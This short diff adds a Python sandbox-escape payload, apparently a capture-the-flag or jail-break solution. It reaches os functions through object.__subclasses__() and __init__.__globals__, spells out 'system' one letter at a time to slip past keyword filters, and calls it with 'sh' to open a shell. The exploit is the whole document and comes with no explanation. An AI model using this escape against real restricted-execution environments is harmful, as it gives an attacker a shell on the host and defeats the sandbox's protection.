@@ -1,0 +1,11 @@
+a = ().__class__.__base__.__subclasses__()[127].__init__.__globals__
+
+THE MATRIX >>> i = "s"
+THE MATRIX >>> j = "y"
+THE MATRIX >>> k = "t"
+THE MATRIX >>> l = "e"
+THE MATRIX >>> m = "m"
+THE MATRIX >>> print(i+j+i+k+l+m)
+system
+
+a[i+j+i+k+l+m](i+"h")
